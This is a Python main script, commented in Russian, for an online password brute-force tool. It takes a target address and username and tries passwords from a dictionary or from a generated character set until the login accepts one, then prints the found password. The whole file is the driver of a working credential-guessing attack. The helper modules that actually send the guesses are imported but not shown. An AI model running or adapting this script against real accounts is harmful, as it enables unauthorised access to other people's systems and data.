from sys import argv

from BruteForceDictionary import BruteForceDictionary
from BruteForceOptional import BruteForceOptional
from PasswordSender import PasswordSender

# Работа с параметрами вызова программы
option = argv[1]
address = argv[2]
username = argv[3]


if __name__ == '__main__':
    # Инициализация подборщика пароля
    brute = []
    # Создание отправителя пароля
    sender = PasswordSender(address, username)
    # Маркер, помогающий сделать вывод об успешности атаки
    correct = False

    # Если работа со словарём
    if option[0] == 'd':
        # Создание подборщика
        brute = BruteForceDictionary()
    # Елси работа с формированием пароля
    elif option[0] == 'o':
        # Инициализируем поля
        length = 0
        characters = ""
        # Получаем информацию о длине и символах пароля
        try:
            length = int(argv[4])
            characters = argv[5]
        except Exception:
            # Вывод ошибки
            raise Exception("Неверный ввод: отсутствуют параметры длины и набора символов")
        # Создание подборщика
        brute = BruteForceOptional(characters, length)

    # Получем начальный пароль и инициализируем поле
    password = brute.get_password()
    # Пока не вернули пустой пароль
    while password != "":
        # Если получилось подобрать пароль
        if sender.send_password(password):
            print("\nПароль для пользователя {0} найден: {1}".format(username, password))
            correct = True
            break
        else:
            # Следующая попытка подбора
            password = brute.get_password()

    # Итоговый вывод
    if not correct:
        print("\nПароль для пользователя {0} не был найден".format(username))

